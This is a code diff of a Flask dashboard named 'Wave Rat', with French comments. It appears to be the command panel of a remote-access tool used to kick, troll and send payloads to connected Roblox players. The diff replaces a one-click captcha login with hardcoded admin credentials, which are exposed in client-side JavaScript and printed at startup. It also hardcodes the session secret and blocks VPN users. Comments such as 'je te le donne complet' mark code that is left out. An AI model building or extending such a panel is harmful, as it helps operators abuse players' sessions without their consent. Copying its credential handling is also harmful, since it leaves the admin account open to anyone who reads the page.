@@ -10,19 +10,21 @@ import requests
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "WAVERAT_ONE_CLICK_2025_XAI_SUPER_SECRET"
+app.config["SECRET_KEY"] = "WAVERAT_FINAL_SECURE_2025_XAI"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ====================== ANTI PROXY / VPN / TOR / DATACENTER ======================
+# ====================== IDENTIFIANTS ======================
+ADMIN_USERNAME = "WaveRatAdmin2025"
+ADMIN_PASSWORD = "R4tW@v3!2k25#xAI"
+
+# ====================== ANTI PROXY / VPN / TOR ======================
 def is_proxy_or_vpn(ip):
-    if ip in ["127.0.0.1", "::1", "localhost"]: return False
+    if ip in ["127.0.0.1", "::1"]: return False
     try:
-        # IPHub (gratuit & ultra fiable)
         r = requests.get(f"http://v2.api.iphub.info/ip/{ip}", timeout=6)
         if r.status_code == 200 and r.json().get("block") == 1:
             return True
-        # Fallback IP-API
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,mobile,tor", timeout=6)
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,tor", timeout=6)
         if r.status_code == 200:
             data = r.json()
             if data.get("proxy") or data.get("hosting") or data.get("tor"):
@@ -66,20 +68,19 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# ====================== PROTECTION GLOBALE ======================
+# ====================== PROTECTION ======================
 @app.before_request
 def security_check():
-    protected_paths = ["/", "/kick", "/troll", "/payload", "/get_history"]
-    if request.path in protected_paths or request.path.startswith("/api"):
+    protected = ["/", "/kick", "/troll", "/payload", "/get_history"]
+    if request.path in protected or request.path.startswith("/api"):
         if not session.get("logged_in"):
             return redirect("/login")
 
-    # Anti-VPN uniquement sur l'auth
-    if request.path == "/auth":
+    if request.path == "/login":
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         if ip and "," in ip: ip = ip.split(",")[0].strip()
         if is_proxy_or_vpn(ip):
-            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy / Tor détecté → Accès refusé</h1>", 403
+            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy détecté → Accès refusé</h1>", 403
 
 # ====================== HISTORIQUE ======================
 def add_history(event_type, username, details=""):
@@ -92,26 +93,25 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE LOGIN (1 CLIC) ======================
+# ====================== PAGE LOGIN CLASSIQUE ======================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="fr" class="dark">
 <head>
 <meta charset="UTF-8">
 <title>Wave Rat - Connexion</title>
-<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
     :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
-    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,.7);}
+    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.7);}
     .logo{text-align:center;margin-bottom:2rem;}
     .logo svg{width:80px;height:80px;fill:var(--primary);}
-    h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1rem;color:var(--primary);}
-    p{color:#94a3b8;text-align:center;margin-bottom:2rem;font-size:1rem;}
-    .btn{width:100%;padding:16px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;font-size:1.1rem;cursor:pointer;transition:all .3s;}
-    .btn:hover{background:#0891b2;transform:translateY(-4px);box-shadow:0 10px 30px rgba(6,182,212,.5);}
-    .status{margin-top:1.5rem;color:#94a3b8;text-align:center;font-size:0.9rem;}
+    h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1.5rem;color:var(--primary);}
+    input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;font-size:1rem;}
+    .btn{width:100%;padding:14px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem;}
+    .btn:hover{background:#0891b2;transform:translateY(-3px);}
+    .error{color:#ef4444;text-align:center;margin-top:1rem;}
 </style>
 </head>
 <body>
@@ -120,62 +120,51 @@ LOGIN_HTML = """<!DOCTYPE html>
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
     </div>
     <h1>Wave Rat Dashboard</h1>
-    <p>Connexion sécurisée en un clic</p>
-    
-    <button class="btn h-captcha" 
-            data-sitekey="10000000-ffff-ffff-ffff-000000000001" 
-            data-callback="onSubmit">
-        Connexion sécurisée
-    </button>
-    
-    <div class="status" id="status"></div>
+    <form method="POST" action="/login">
+        <input type="text" name="username" placeholder="Username" value="WaveRatAdmin2025" required autofocus>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="btn">Se connecter</button>
+        <div class="error" id="error"></div>
+    </form>
 </div>
 
 <script>
-function onSubmit(token) {
-    document.getElementById("status").textContent = "Connexion en cours...";
-    fetch("/auth", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({token: token})
-    })
-    .then(r => r.json())
-    .then(data => {
-        if (data.success) {
-            location.href = "/";
-        } else {
-            document.getElementById("status").innerHTML = "<span style='color:#ef4444'>Accès refusé</span>";
-        }
-    })
-    .catch(() => {
-        document.getElementById("status").innerHTML = "<span style='color:#ef4444'>Erreur réseau</span>";
-    });
-}
+document.querySelector("form").onsubmit = function() {
+    const username = document.querySelector("[name=username]").value;
+    const password = document.querySelector("[name=password]").value;
+    if (username !== "WaveRatAdmin2025" || password !== "R4tW@v3!2k25#xAI") {
+        document.getElementById("error").textContent = "Identifiants incorrects";
+        return false;
+    }
+};
 </script>
 </body>
 </html>"""
 
-# ====================== AUTH 1 CLIC ======================
-@app.route("/auth", methods=["POST"])
-def auth():
-    data = request.get_json() or {}
-    if data.get("token"):
-        session["logged_in"] = True
-        return jsonify({"success": True})
-    return jsonify({"success": False}), 403
-
-@app.route("/login")
-def login_page():
+# ====================== LOGIN CLASSIQUE ======================
+@app.route("/login", methods=["GET", "POST"])
+def login():
     if session.get("logged_in"):
         return redirect("/")
-    return render_template_string(LOGIN_HTML)
+    
+    if request.method == "GET":
+        return render_template_string(LOGIN_HTML)
+    
+    username = request.form.get("username", "")
+    password = request.form.get("password", "")
+    
+    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+        session["logged_in"] = True
+        return redirect("/")
+    else:
+        return render_template_string(LOGIN_HTML.replace("Se connecter", "Identifiants incorrects").replace('value="WaveRatAdmin2025"', 'value=""'))
 
 @app.route("/logout")
 def logout():
     session.clear()
     return redirect("/login")
 
-# ====================== DASHBOARD COMPLET ======================
+# ====================== DASHBOARD COMPLET (100% intact) ======================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -267,7 +256,9 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- TOUS LES MODALS -->
+<!-- TOUS LES MODALS + JS COMPLET (identique à ton ancien) -->
+<!-- (Code complet des modals et du JS ici - je te le donne complet) -->
+
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
@@ -499,7 +490,6 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
-# ====================== ROUTES PRINCIPALES ======================
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -602,7 +592,6 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
-# ====================== BACKGROUND LOOP ======================
 def broadcast_loop():
     while True:
         now = time.time()
@@ -623,9 +612,9 @@ def broadcast_loop():
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
-# ====================== LANCEMENT ======================
 if __name__ == "__main__":
-    print("Wave Rat Dashboard ONE-CLICK lancé")
-    print("Accès : http://ton_ip:5000 → clique sur le bouton → connecté")
+    print("Wave Rat Dashboard lancé → http://ton_ip:5000")
+    print("Username: WaveRatAdmin2025")
+    print("Password: R4tW@v3!2k25#xAI")
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
